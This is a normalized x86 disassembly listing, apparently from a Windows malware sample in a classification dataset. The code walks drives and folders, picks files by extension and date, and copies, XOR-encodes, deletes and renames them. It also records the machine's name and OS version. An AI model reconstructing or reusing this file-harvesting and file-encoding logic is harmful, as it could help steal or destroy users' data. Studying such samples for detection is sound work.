and ecx 0xffff
push eax
lea edx [ esp + 0x184 ]
push ecx
push edx
lea eax [ esp + 0x68c ]
push rw-data
push eax
call ebp
lea ecx [ esp + 0x694 ]
push ecx
call sub_403770
push rw-data
call sub_403770
lea edx [ esp + 0x29c ]
push edx
call sub_402340
add esp 0x2c
test eax eax
je r-xdata
mov esi [ esp + 0x10 ]
lea edx [ esp + 0x34 ]
push edx
push esi
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push 0xa
mov [ rw-data ] eax
call [ Sleep@IAT ]
lea eax [ esp + 0x24 ]
lea ecx [ esp + 0x48 ]
push eax
push ecx
call ebx
mov edx [ esp + 0x2e ]
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x2a ]
and edx 0xffff
and eax 0xffff
push edx
mov edx [ esp + 0x2a ]
push eax
mov eax [ esp + 0x2c ]
and ecx 0xffff
and edx 0xffff
push ecx
and eax 0xffff
push edx
push eax
lea ecx [ esp + 0x188 ]
push esi
push ecx
lea edx [ esp + 0x690 ]
push rw-data
push edx
call ebp
lea eax [ esp + 0x698 ]
push eax
call sub_403770
push rw-data
call sub_403770
add esp 0x2c
inc esi
mov eax [ esp + 0x10 ]
push eax
call [ FindClose@IAT ]
push rw-data
call sub_403770
add esp 0x4
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xa64
retn
jmp r-xdata
push esi
call [ FindClose@IAT ]
jmp r-xdata
cmp [ esp + 0x60 ] 0x2e
je r-xdata
sub_4025b0
sub esp 0x254
push ebp
mov ebp [ esp + 0x25c ]
push esi
push edi
push rw-data
push ebp
call [ strstr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x1c ]
lea edx [ esp + 0x1c ]
[ edi ]
lea ecx [ esp + 0xc ]
mov [ esp + 0x48 ] 0x1
push ecx
push edx
push eax
push eax
push eax
push eax
push eax
push eax
push ebp
push eax
mov [ esp + 0x74 ] ax
call [ CreateProcessA@IAT ]
pop edi
pop esi
pop ebp
add esp 0x254
retn
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x60 ]
mov eax ecx
mov esi edi
mov edi edx
push 0x22
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov esi [ strchr@IAT ]
lea ecx [ esp + 0x64 ]
push ecx
call esi
add esp 0x8
test eax eax
je r-xdata
inc eax
push 0x22
push eax
call esi
add esp 0x8
test eax eax
je r-xdata
lea edx [ esp + 0x60 ]
push 0x5c
push edx
mov [ eax ] 0x0
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
cmp [ eax - 0x1 ] 0x3a
jne r-xdata
mov [ eax ] 0x0
mov [ eax + 0x1 ] 0x0
jmp r-xdata
lea eax [ esp + 0x61 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
sub_402690
sub esp 0x200
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push esi
push edi
mov edi rw-data
push 0x5c
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
push ecx
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x200
retn
mov [ eax ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
push ebx
lea edx [ esp + 0xc ]
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
push rw-data
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ DeleteFileA@IAT ]
call esi
lea eax [ esp + 0xc ]
push eax
call esi
call sub_4037b0
call sub_403830
call sub_403da0
call sub_404110
lea ecx [ esp + 0xc ]
push ecx
push rw-data
call [ rename@IAT ]
lea edx [ esp + 0x14 ]
push edx
call sub_402de0
add esp 0xc
lea eax [ esp + 0xc ]
push eax
call esi
pop ebx
sub_402760
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push esi
push edi
mov edi rw-data
push 0x5c
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xc ]
push ecx
call [ strrchr@IAT ]
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
add esp 0x400
retn
push ebx
lea edx [ esp + 0xc ]
mov [ eax ] 0x0
push rw-data
push edx
lea eax [ esp + 0x14 ]
push rw-data
push eax
call [ sprintf@IAT ]
mov esi [ DeleteFileA@IAT ]
add esp 0x10
push rw-data
call esi
lea ecx [ esp + 0xc ]
push ecx
call esi
lea edx [ esp + 0x20c ]
xor ebx ebx
push edx
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea ecx [ esp + 0xc ]
push ecx
push rw-data
call [ rename@IAT ]
lea edx [ esp + 0x14 ]
push edx
call sub_402de0
add esp 0xc
lea eax [ esp + 0xc ]
push eax
call esi
pop ebx
mov al [ esp + 0x20c ]
test al al
je r-xdata
push ebp
mov ebp [ toupper@IAT ]
add ebx edi
mov al [ esp + ebx + 0x210 ]
test al al
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x5
je r-xdata
lea esi [ esp + ebx + 0x210 ]
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
movsx eax [ esi ]
not ecx
dec ecx
push eax
mov edi ecx
inc edi
call ebp
add esp 0x4
cmp eax 0x43
jl r-xdata
mov esi [ DeleteFileA@IAT ]
pop ebp
push esi
call sub_403770
push rw-data
call sub_403770
push esi
call sub_402310
add esp 0xc
sub_4028a0
mov eax [ esp + 0x4 ]
push ebx
push esi
push edi
push 0x2e
push eax
call [ strrchr@IAT ]
mov edi [ lstrcmpiA@IAT ]
add esp 0x8
mov ebx eax
mov esi rw-data
pop edi
pop esi
xor eax eax
pop ebx
retn
test ebx ebx
je r-xdata
push rw-data
push esi
call edi
test eax eax
je r-xdata
lea ecx [ esi + 0x2 ]
lea edx [ ebx + 0x1 ]
push ecx
push edx
call edi
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn
add esi 0x10
cmp esi rw-data
jl r-xdata
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
sub_402900
sub esp 0x550
push 0x0
call [ CoInitialize@IAT ]
lea eax [ esp ]
push eax
push r--data
push 0x1
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jl r-xdata
add esp 0x550
retn
mov eax [ esp ]
lea edx [ esp + 0x4 ]
push edx
push r--data
mov ecx [ eax ]
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ esp ]
push eax
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov ecx [ esp + 0x554 ]
lea eax [ esp + 0x348 ]
push 0x104
push eax
push 0xffffffff
push ecx
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x348 ]
push 0x0
push ecx
mov edx [ eax ]
push eax
call [ edx + 0x14 ]
test eax eax
jl r-xdata
mov eax [ esp + 0x4 ]
push eax
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esp ]
lea ecx [ esp + 0x8 ]
push 0x2
push ecx
mov edx [ eax ]
lea ecx [ esp + 0x150 ]
push 0x104
push ecx
push eax
call [ edx + 0xc ]
test eax eax
jl r-xdata
cmp [ esp + 0x148 ] 0x42
jle r-xdata
mov edx [ esp + 0x8 ]
and edx 0x10
cmp dl 0x10
je r-xdata
lea eax [ esp + 0x34 ]
push eax
call sub_4028a0
add esp 0x4
test eax eax
je r-xdata
lea ecx [ esp + 0x148 ]
push ecx
call sub_402de0
add esp 0x4
sub_402a00
sub esp 0x640
lea eax [ esp ]
push ebx
push esi
push edi
push 0x8
push 0x100
push eax
call sub_405e30
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x44c ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10c ]
and ecx 0x3
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x10 ]
push ecx
call [ FindFirstFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
pop edi
pop esi
pop ebx
add esp 0x640
retn
push ebp
mov ebp [ FindNextFileA@IAT ]
or ecx 0xffffffff
lea edi [ esp + 0x450 ]
xor eax eax
lea edx [ esp + 0x250 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x250 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x250 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x13c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x250 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_402900
add esp 0x4
lea ecx [ esp + 0x110 ]
push ecx
push ebx
call ebp
test eax eax
jne r-xdata
push ebx
call [ FindClose@IAT ]
pop ebp
sub_402b60
push ecx
call sub_405fb0
call sub_402a00
mov eax [ rw-data ]
mov [ esp ] 0x0
test eax eax
jle r-xdata
pop ecx
retn
push ebx
push ebp
push esi
push edi
mov edi rw-data
mov eax [ esp + 0x10 ]
mov ecx [ rw-data ]
inc eax
add edi 0x884
cmp eax ecx
mov [ esp + 0x10 ] eax
jl r-xdata
lea ebp [ edi + 0x4 ]
lea esi [ edi + 0x104 ]
mov eax [ edi ]
xor ebx ebx
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
push esi
push ebp
call sub_402bd0
mov eax [ edi ]
add esp 0x8
inc ebx
add esi 0x40
cmp ebx eax
jl r-xdata
sub_402bd0
sub esp 0x65c
mov eax [ esp + 0x660 ]
push ebx
push ebp
push esi
push edi
push eax
lea ecx [ esp + 0x470 ]
push rw-data
push ecx
call [ sprintf@IAT ]
add esp 0xc
lea edx [ esp + 0x2c ]
lea eax [ esp + 0x46c ]
push edx
push eax
call [ FindFirstFileA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
mov [ esp + 0x18 ] ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x65c
retn
mov ebx [ GetSystemTime@IAT ]
mov ebp [ esp + 0x18 ]
lea ecx [ esp + 0x2c ]
push ecx
push ebp
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
lea edi [ esp + 0x58 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x16c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
mov edx [ esp + 0x670 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ esp + 0x26c ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x16c ]
push ecx
push edx
push rw-data
push eax
call [ sprintf@IAT ]
mov al [ esp + 0x3c ]
add esp 0x10
test al 0x10
je r-xdata
push ebp
call [ FindClose@IAT ]
jmp r-xdata
mov eax [ rw-data ]
mov ebp 0x1
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x674 ]
lea edx [ esp + 0x26c ]
push ecx
push edx
call sub_402bd0
add esp 0x8
test eax eax
je r-xdata
cmp [ esp + 0x58 ] 0x2e
je r-xdata
mov edi [ esp + 0x674 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x2
jb r-xdata
lea eax [ esp + 0x1c ]
push eax
call ebx
lea ecx [ esp + 0x10 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
call [ SystemTimeToFileTime@IAT ]
mov eax [ rw-data ]
push 0xffffff36
cdq
push 0xd5964000
push edx
push eax
call sub_40bd90
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x14 ]
add ecx eax
lea eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ecx
lea ecx [ esp + 0x40 ]
adc edi edx
push eax
push ecx
mov [ esp + 0x1c ] edi
call [ CompareFileTime@IAT ]
test eax eax
jge r-xdata
push ebp
call [ FindClose@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x65c
retn
jmp r-xdata
lea edx [ esp + 0x58 ]
push 0x2e
push edx
call [ strrchr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
xor ebp ebp
lea esi [ eax + 0x2 ]
lea eax [ esp + 0x58 ]
mov eax [ esp + 0x674 ]
mov cl [ eax + 0x2 ]
test cl cl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
jmp r-xdata
test ebp ebp
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
lea eax [ esp + 0x26c ]
push eax
call sub_402de0
add esp 0x4
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_402de0
sub esp 0x608
push ebx
mov ebx [ esp + 0x610 ]
push ebp
push esi
push edi
push 0x5c
push ebx
call [ strrchr@IAT ]
mov edx eax
add esp 0x8
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x608
retn
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea ebp [ esp + 0x18 ]
[ edi ]
not ecx
sub edi ecx
push 0x0
mov eax ecx
mov esi edi
mov edi ebp
lea ebp [ esp + 0x1c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x21c ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x21c ]
push ecx
push ebx
call [ CopyFileA@IAT ]
lea edx [ esp + 0x18 ]
push rw-data
push edx
lea eax [ esp + 0x20 ]
push rw-data
push eax
call [ sprintf@IAT ]
lea ecx [ esp + 0x228 ]
push ecx
call sub_4030d0
mov esi eax
add esp 0x14
cmp esi 0xffffffff
je r-xdata
lea edx [ esp + 0x218 ]
push edx
call [ DeleteFileA@IAT ]
test esi esi
je r-xdata
mov ecx [ rw-data ]
xor edx edx
div ecx
xor edx edx
mov edi eax
mov eax esi
div ecx
mov [ esp + 0x10 ] edi
test edx edx
je r-xdata
push ecx
call [ malloc@IAT ]
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
inc edi
mov [ esp + 0x10 ] edi
cmp esi [ rw-data ]
ja r-xdata
lea edx [ esp + 0x218 ]
push rw-data
push edx
call [ fopen@IAT ]
add esp 0x8
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
lea eax [ esp + 0x18 ]
lea ecx [ esp + 0x218 ]
push eax
push ecx
call sub_403180
add esp 0x8
jmp r-xdata
push ebp
call [ free@IAT ]
add esp 0x4
lea ecx [ esp + 0x218 ]
push 0x0
push ecx
call [ SetFileAttributesA@IAT ]
lea edx [ esp + 0x218 ]
push edx
call [ DeleteFileA@IAT ]
lea eax [ esp + 0x218 ]
lea ecx [ esp + 0x18 ]
push eax
push ecx
call [ rename@IAT ]
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0x608
retn
mov ebx 0x1
cmp edi ebx
jl r-xdata
push eax
call [ fclose@IAT ]
add esp 0x4
jmp r-xdata
push ebx
lea eax [ esp + 0x21c ]
push edi
push eax
lea ecx [ esp + 0x424 ]
push rw-data
push ecx
call [ sprintf@IAT ]
lea edi [ esp + 0x42c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x2c ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x30 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x30 ]
push ecx
push rw-data
push edx
call [ sprintf@IAT ]
mov eax [ esp + 0x38 ]
mov ecx [ rw-data ]
push eax
push ecx
push 0x1
push ebp
call [ fread@IAT ]
lea edx [ esp + 0x44c ]
push rw-data
push edx
mov edi eax
call [ fopen@IAT ]
mov esi eax
add esp 0x3c
test esi esi
je r-xdata
mov eax [ esp + 0x14 ]
push esi
push edi
push 0x1
push ebp
call [ fwrite@IAT ]
push esi
call [ fclose@IAT ]
lea eax [ esp + 0x2c ]
lea ecx [ esp + 0x42c ]
push eax
push ecx
call sub_403180
lea edx [ esp + 0x34 ]
lea eax [ esp + 0x234 ]
push edx
push eax
call sub_405f10
add esp 0x24
lea ecx [ esp + 0x418 ]
push ecx
call [ DeleteFileA@IAT ]
lea edx [ esp + 0x418 ]
lea eax [ esp + 0x18 ]
push edx
push eax
call [ rename@IAT ]
mov eax [ esp + 0x18 ]
add esp 0x8
inc ebx
cmp ebx eax
jle r-xdata
mov edi [ esp + 0x10 ]
sub_4030d0
mov eax [ esp + 0x4 ]
push esi
push 0x0
push 0x80
push 0x3
push 0x0
push 0x3
push 0x80000000
push eax
call [ CreateFileA@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push 0x0
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
retn
or eax eax
pop esi
retn
sub_403120
push esi
push edi
mov edi [ esp + 0xc ]
push rw-data
push edi
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push esi
push 0x4
lea eax [ esp + 0x14 ]
push 0x1
push eax
call [ fread@IAT ]
push esi
call [ fclose@IAT ]
push edi
call sub_4030d0
mov ecx eax
mov edx [ esp + 0x24 ]
and ecx 0xff
add esp 0x18
shl ecx 0x10
shr eax 0x8
or ecx eax
xor eax eax
pop edi
pop esi
lea ecx [ ecx + ecx * 2 ]
cmp edx ecx
sete al
retn
pop edi
pop esi
retn
sub_403180
sub esp 0x10
push ebx
push ebp
push esi
mov esi [ esp + 0x20 ]
push edi
push esi
call sub_403120
add esp 0x4
test eax eax
je r-xdata
push esi
call sub_4030d0
mov ecx [ rw-data ]
add esp 0x4
cmp eax ecx
mov [ esp + 0x14 ] eax
ja r-xdata
mov eax [ esp + 0x28 ]
push 0x0
push eax
push esi
call [ CopyFileA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
push rw-data
push esi
mov esi [ fopen@IAT ]
call esi
mov ecx [ esp + 0x30 ]
push rw-data
push ecx
mov ebx eax
call esi
add esp 0x10
mov esi eax
test ebx ebx
je r-xdata
test esi esi
je r-xdata
mov ebp [ rw-data ]
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x18 ] ebp
fild [ esp + 0x18 ]
fmul [ r--data ]
call _ftol
mov edi 0x10
push ebp
mov ebp [ malloc@IAT ]
sub edi eax
call ebp
add esp 0x4
mov [ rw-data ] eax
test eax eax
je r-xdata
push edi
call ebp
add esp 0x4
mov [ rw-data ] eax
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ rw-data ]
push ebx
push edx
push 0x1
push eax
call [ fread@IAT ]
mov ecx [ rw-data ]
push eax
mov eax [ rw-data ]
lea edx [ esp + 0x24 ]
push ecx
push edx
push eax
call sub_406269
add esp 0x20
test eax eax
jne r-xdata
mov edi [ fclose@IAT ]
push ebx
call edi
push esi
call edi
mov edx [ rw-data ]
mov esi [ free@IAT ]
push edx
call esi
mov eax [ rw-data ]
push eax
call esi
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push ecx
push edx
call sub_405f10
add esp 0x18
mov ecx [ esp + 0x10 ]
mov edx [ rw-data ]
push ecx
push edx
call sub_403320
mov eax [ esp + 0x18 ]
mov edi [ fwrite@IAT ]
push esi
push 0x4
lea ecx [ eax + 0x4 ]
lea edx [ esp + 0x24 ]
mov eax ecx
push 0x1
and eax 0xff
push edx
shl eax 0x10
shr ecx 0x8
or eax ecx
lea ecx [ eax + eax * 2 ]
mov [ esp + 0x2c ] ecx
call edi
mov eax [ esp + 0x28 ]
mov ecx [ rw-data ]
push esi
push eax
push 0x1
push ecx
call edi
add esp 0x28
sub_403320
push edi
mov edi [ esp + 0xc ]
xor ecx ecx
test edi edi
jle r-xdata
pop edi
retn
push esi
mov esi [ esp + 0xc ]
mov al [ ecx + esi ]
add al cl
mov dl al
shr dl 0x4
shl al 0x4
add dl al
xor dl 0x23
mov [ ecx + esi ] dl
inc ecx
cmp ecx edi
jl r-xdata
pop esi
sub_403350
push ebx
mov ebx [ WaitForSingleObject@IAT ]
push ebp
mov ebp [ Sleep@IAT ]
push esi
mov esi [ SetEvent@IAT ]
push edi
mov edi [ ExitProcess@IAT ]
push 0x1
call ebp
jmp r-xdata
mov ecx [ rw-data ]
push ecx
call esi
push 0x1
call edi
mov eax [ rw-data ]
push 0x0
push eax
call ebx
test eax eax
jne r-xdata
sub_403390
mov eax 0x5fac
call sub_40bdd0
push ebx
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xc ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xc ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push rw-data
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ fopen@IAT ]
add esp 0x8
test eax eax
je r-xdata
push 0x5
lea ecx [ esp + 0x110 ]
push 0x100
push ecx
call sub_405e30
mov eax 0x1
lea edi [ esp + 0x118 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x5fac
retn
push eax
call [ fclose@IAT ]
mov esi [ GetPrivateProfileIntA@IAT ]
add esp 0x4
lea ecx [ esp + 0xc ]
push ecx
push 0x0
push rw-data
push rw-data
call esi
lea edx [ esp + 0xc ]
mov [ rw-data ] eax
push edx
push 0x4e2000
push rw-data
push rw-data
call esi
mov [ rw-data ] eax
lea eax [ esp + 0xc ]
push eax
lea ecx [ esp + 0x210 ]
push 0x5dac
push ecx
push rw-data
push rw-data
push rw-data
call [ GetPrivateProfileStringA@IAT ]
lea edx [ esp + 0xc ]
push edx
push 0xffffffff
push rw-data
push rw-data
call esi
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp eax 0x2710
jae r-xdata
cmp eax 0x4e2000
jbe r-xdata
mov [ rw-data ] 0x2710
jmp r-xdata
lea eax [ esp + 0x20c ]
push eax
call sub_403550
add esp 0x4
pop edi
pop esi
pop ebx
add esp 0x5fac
retn
mov [ rw-data ] 0x4e2000
sub_403550
mov eax 0x5dac
call sub_40bdd0
push ebx
push esi
push edi
mov ecx 0x154a
xor eax eax
mov edi rw-data
[ edi ]
mov edi [ esp + 0x5dbc ]
or ecx 0xffffffff
mov [ rw-data ] 0x0
lea edx [ esp + 0xc ]
[ edi ]
not ecx
sub edi ecx
mov ebx [ strchr@IAT ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea esi [ esp + 0xc ]
dec esi
test edi edi
je r-xdata
mov [ esi ] 0x0
mov eax [ rw-data ]
mov ecx eax
push edi
shl ecx 0x4
add ecx eax
shl ecx 0x5
add ecx eax
lea edx [ ecx * 4 + rw-data ]
push edx
call sub_403630
mov eax [ rw-data ]
add esp 0x8
inc eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ rw-data ]
pop edi
inc eax
pop esi
mov [ rw-data ] eax
pop ebx
add esp 0x5dac
retn
mov eax [ rw-data ]
push edi
mov ecx eax
shl ecx 0x4
add ecx eax
shl ecx 0x5
add ecx eax
lea edx [ ecx * 4 + rw-data ]
push edx
call sub_403630
add esp 0x8
lea edi [ esi + 0x1 ]
push 0x3b
push edi
call ebx
mov esi eax
add esp 0x8
test esi esi
je r-xdata
sub_403630
mov eax 0x5db0
call sub_40bdd0
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x5dc8 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x14 ]
[ edi ]
not ecx
sub edi ecx
mov ebp [ strchr@IAT ]
mov eax ecx
mov esi edi
mov edi edx
push 0x2c
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x18 ]
push ecx
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5db0
retn
lea edi [ esp + 0x14 ]
or ecx 0xffffffff
xor eax eax
mov [ edx ] 0x0
mov ebx [ esp + 0x5dc4 ]
[ edi ]
not ecx
lea esi [ ebx + 0x4 ]
sub edi ecx
mov eax ecx
mov [ esp + 0x10 ] esi
mov esi edi
mov edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
test edi edi
je r-xdata
mov [ edx ] 0x0
mov ecx [ ebx ]
shl ecx 0x6
xor eax eax
lea esi [ ecx + ebx + 0x104 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov [ esp + 0x10 ] esi
mov eax ecx
mov esi edi
mov edi [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
inc [ ebx ]
jmp r-xdata
mov ecx [ ebx ]
xor eax eax
shl ecx 0x6
lea edx [ ecx + ebx + 0x104 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
inc [ ebx ]
lea edi [ edx + 0x1 ]
push 0x2c
push edi
call ebp
mov edx eax
add esp 0x8
test edx edx
je r-xdata
sub_403740
push esi
mov esi [ esp + 0x8 ]
push 0x0
push esi
call [ CreateDirectoryA@IAT ]
push esi
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
push esi
call [ SetFileAttributesA@IAT ]
pop esi
retn
sub_403770
push esi
push edi
push rw-data
push rw-data
call [ fopen@IAT ]
mov edx [ esp + 0x14 ]
mov esi eax
mov edi edx
or ecx 0xffffffff
xor eax eax
push esi
[ edi ]
not ecx
dec ecx
push 0x1
push ecx
push edx
call [ fwrite@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x1c
pop edi
pop esi
retn
sub_4037b0
sub esp 0x200
mov ecx 0x27
xor eax eax
push esi
mov esi [ GetVersionExA@IAT ]
push edi
mov edi rw-data
[ edi ]
push rw-data
mov [ rw-data ] 0x9c
call esi
test eax eax
jne r-xdata
lea eax [ esp + 0x8 ]
push eax
push rw-data
call sub_4044e0
push rw-data
call sub_403770
lea ecx [ esp + 0x14 ]
push ecx
call sub_403770
add esp 0x10
pop edi
pop esi
add esp 0x200
retn
push rw-data
mov [ rw-data ] 0x94
call esi
sub_403830
sub esp 0x104
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push rw-data
mov [ esp + 0x10 ] 0x100
call [ GetComputerNameA@IAT ]
mov ecx [ esp + 0x8 ]
push rw-data
mov [ ecx + rw-data ] 0x0
call sub_403770
push rw-data
call sub_403770
add esp 0x8
